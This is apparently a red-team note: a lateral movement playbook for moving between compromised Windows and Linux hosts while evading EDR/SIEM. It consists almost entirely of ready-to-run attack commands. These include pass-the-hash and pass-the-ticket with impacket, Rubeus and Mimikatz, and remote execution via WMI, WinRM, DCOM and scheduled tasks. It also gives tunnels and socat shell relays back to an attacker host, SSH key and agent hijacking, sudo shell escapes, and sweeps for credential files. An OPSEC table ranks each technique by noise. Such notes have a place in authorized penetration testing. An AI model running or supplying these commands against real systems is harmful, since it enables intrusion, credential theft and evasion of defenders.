# Lateral Movement Playbook

**Tags:** #lateral-movement #pivoting #windows #linux
**Phase:** Post-Exploitation → Full Compromise

---

> **Goal:** Move from host A to target B without triggering EDR/SIEM

---

## 0. Decision Tree

```
Credentials / hashes available?
├── YES
│   ├── WinRM open (5985)?  → Evil-WinRM / Invoke-Command
│   ├── SMB + admin share?  → WMIExec (stealth) | PSExec (noisy)
│   ├── SSH open (22)?      → SSH keys / password auth
│   └── RDP (3389)?         → xfreerdp / PtH if RestrictedAdmin
└── NO → Extract first
    ├── Mimikatz LSASS      → plaintext / NTLM
    ├── Rubeus dump tickets → PtT
    ├── SAM/registry dump   → local hashes
    └── Credential files    → findstr / grep sweep
```

---

## 1. Built-in Windows Methods (No Tools Dropped)

### 1.1 WMI Execution

```cmd
wmic /node:TARGET process call create "cmd /c whoami > C:\Windows\Temp\out.txt"
type \\TARGET\C$\Windows\Temp\out.txt
```

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "powershell -enc BASE64" -ComputerName TARGET
```

```bash
# From Linux (impacket) — no service install, semi-interactive shell
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH
```

### 1.2 WinRM (Port 5985/5986)

```bash
# Check WinRM
netexec winrm $TARGET -u $USER -p $PASS

# Evil-WinRM — best interactive WinRM shell
evil-winrm -i $TARGET -u $USER -p $PASS
evil-winrm -i $TARGET -u $USER -H NTLMHASH
evil-winrm -i $TARGET -u $USER -p $PASS -s /opt/scripts/ -e /opt/exes/
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential($USER,
  (ConvertTo-SecureString $PASS -AsPlainText -Force))
Enter-PSSession -ComputerName TARGET -Credential $cred
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; ipconfig }
```

### 1.3 PSExec (Creates Service — Noisy)

```bash
impacket-psexec $DOMAIN/$USER:$PASS@$TARGET
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH
```

### 1.4 SMBExec (Semi-Stealthy)

```bash
impacket-smbexec $DOMAIN/$USER:$PASS@$TARGET
impacket-smbexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH
```

### 1.5 Scheduled Tasks

```cmd
schtasks /create /s TARGET /u $USER /p $PASS /tn TempTask \
  /tr "powershell -enc BASE64" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s TARGET /tn TempTask
schtasks /delete /s TARGET /tn TempTask /f
```

### 1.6 DCOM (Port 135 — Very Stealthy)

```powershell
$com = [System.Activator]::CreateInstance(
  [System.Type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null,
  "/c whoami > C:\Windows\Temp\out.txt", "7")
```

---

## 2. Pass-the-Hash (PtH)

```bash
# WMIExec — recommended for stealth
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:NTLMHASH

# SMBExec
impacket-smbexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH

# PSExec (noisy)
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH

# Evil-WinRM
evil-winrm -i $TARGET -u $USER -H NTLMHASH

# Subnet spray
netexec smb 192.168.10.0/24 -u Administrator -H NTLMHASH --local-auth

# RDP with PtH (requires Restricted Admin mode)
xfreerdp /v:$TARGET /u:$USER /pth:NTLMHASH /d:$DOMAIN
# Enable RestrictedAdmin (if RCE available)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

---

## 3. Pass-the-Ticket (PtT)

```bash
# Dump tickets (Windows — Rubeus, no LSASS touch)
.\Rubeus.exe dump /nowrap
.\Rubeus.exe dump /service:krbtgt /nowrap

# Inject ticket
.\Rubeus.exe ptt /ticket:Base64Ticket
klist  # Verify

# Monitor for inbound TGTs (unconstrained delegation abuse)
.\Rubeus.exe monitor /interval:5 /targetuser:Administrator /nowrap

# Linux with ccache file
export KRB5CCNAME=/tmp/Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$TARGET -k -no-pass
impacket-wmiexec $DOMAIN/Administrator@$TARGET -k -no-pass
```

---

## 4. Over-Pass-the-Hash

```bash
# Rubeus — NTLM hash to TGT without touching LSASS
.\Rubeus.exe asktgt /user:$USER /rc4:NTLMHASH /ptt
.\Rubeus.exe asktgt /user:$USER /aes256:AES256HASH /opsec /ptt  # Stealthier

# Mimikatz (touches LSASS)
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:NTLMHASH /run:cmd
```

---

## 5. Network Pivoting & Tunneling

### 5.1 Chisel (Go-based, Firewall-Friendly)

```bash
# Kali — reverse SOCKS server
./chisel server --reverse -p 8080

# Target — expose internal network via SOCKS5 on Kali:1080
./chisel client $LHOST:8080 R:socks
.\chisel.exe client $LHOST:8080 R:socks  # Windows

# Proxychains config
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains impacket-smbexec $DOMAIN/$USER:$PASS@192.168.10.5
proxychains nmap -sT -Pn -p 445 192.168.10.0/24

# Forward single port
.\chisel.exe client $LHOST:8080 R:5432:192.168.10.5:5432
```

### 5.2 Ligolo-ng (Clean TUN Interface — No Proxychains Needed)

```bash
# Kali setup
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Target — upload + run agent
./agent -connect $LHOST:11601 -ignore-cert
.\agent.exe -connect $LHOST:11601 -ignore-cert  # Windows

# Ligolo console
session
[0] start
sudo ip route add 192.168.10.0/24 dev ligolo

# Double pivot
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp  # via first agent
```

### 5.3 SSH Tunneling

```bash
# Local forward — expose remote service locally
ssh -N -L 5432:192.168.10.5:5432 user@$TARGET

# Dynamic SOCKS — proxy through target
ssh -N -D 0.0.0.0:1080 user@$TARGET
proxychains curl http://192.168.10.5

# Remote forward — receive shells from internal network on Kali
ssh -N -R 4444:127.0.0.1:4444 user@$TARGET

# Hop: jump through two machines
ssh -J hop1_user@$HOP1 -L 3389:192.168.10.5:3389 user@$HOP2
```

### 5.4 Socat Relay

```bash
# Relay on compromised host
socat TCP-LISTEN:8080,fork TCP:192.168.10.5:80 &

# Bidirectional shell relay
# On compromised host:
socat TCP-LISTEN:9000,fork TCP:$LHOST:4444 &
# Internal shell → compromised:9000 → Kali:4444
```

### 5.5 Netsh (Windows — No Binary Needed)

```cmd
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.10.5 connectport=80
netsh advfirewall firewall add rule name="pivot" protocol=TCP dir=in localport=8080 action=allow

# Cleanup
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080
netsh advfirewall firewall delete rule name="pivot"
```

---

## 6. Linux Lateral Movement

### 6.1 SSH Key Abuse

```bash
# Hunt for private keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts

# Use found key
chmod 600 found_key
ssh -i found_key user@$TARGET

# Add our key if writable
echo "ssh-rsa AAAA... kali@kali" >> /home/user/.ssh/authorized_keys
```

### 6.2 SSH Agent Hijack

```bash
find /tmp -name "agent.*" 2>/dev/null
export SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.XXXXX
ssh-add -l
ssh user@$TARGET  # Use victim's loaded keys without knowing them
```

### 6.3 Sudo Abuse (GTFOBins)

```bash
sudo -l  # What can we run?

sudo vim -c ':!/bin/bash'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo find / -exec /bin/bash \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash"'
sudo less /etc/passwd  # then type: !bash
```

---

## 7. Credential Hunting on New Host

### Windows

```cmd
findstr /si password *.txt *.xml *.ini *.config *.ps1 *.bat
dir /s *pass* *cred* *vnc* *.config 2>/dev/null
reg query HKLM /f password /t REG_SZ /s
type C:\Windows\Panther\Unattend.xml
type C:\inetpub\wwwroot\web.config
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

### Linux

```bash
grep -rn "password\|passwd\|secret" /etc/*.conf 2>/dev/null
grep -rn "password" /var/www/ 2>/dev/null
find / -name "*.env" 2>/dev/null | xargs grep -l "password"
cat ~/.bash_history /root/.bash_history 2>/dev/null
```

---

## 8. Discover Internal Targets

```bash
# Ping sweep
for i in $(seq 1 254); do ping -c1 -W1 192.168.10.$i &>/dev/null && echo "ALIVE: 192.168.10.$i"; done
nmap -sn 192.168.10.0/24 --open

# Port scan (via proxychains)
proxychains nmap -sT -Pn -p 22,80,135,139,443,445,3389,5985 192.168.10.0/24 --open

# PowerShell port sweep
1..254 | ForEach { $ip="192.168.10.$_"; 22,445,3389,5985 | ForEach {
  if (Test-NetConnection -ComputerName $ip -Port $_ -InformationLevel Quiet -WarningAction SilentlyContinue) {
    Write-Host "OPEN: $ip`:$_" }}}
```

---

## OPSEC Comparison

| Technique | Noise | Service? | Disk Write | Detection |
|-----------|-------|----------|------------|-----------|
| WMIExec | Medium | No | No | 4688, WMI logs |
| WinRM/Evil-WinRM | Low | No | No | 4624 Type 3 |
| PSExec | High | Yes | Yes | 7045, 4688 |
| SMBExec | Medium | Yes (temp) | Minimal | 7045 |
| PtH via impacket | Medium | No | No | 4624 NTLM |
| PtT via Rubeus | Low | No | No | 4624 Kerberos |
| PtH via Mimikatz | High | No | No | Sysmon 10 LSASS |
| Chisel | Low | No | Binary | Unusual outbound |
| Ligolo-ng | Low | No | Binary | Unusual outbound |
| SSH tunnel | Very Low | No | No | Native traffic |

---

## Related Notes

- [[08-Active-Directory/INDEX]]
- [[00-Quick-Reference/Pivoting]]
- [[00-Quick-Reference/Tunneling]]
- [[00-Quick-Reference/Mimikatz]]
- [[00-Quick-Reference/Evil-WinRM]]
- [[00-Quick-Reference/OPSEC]]
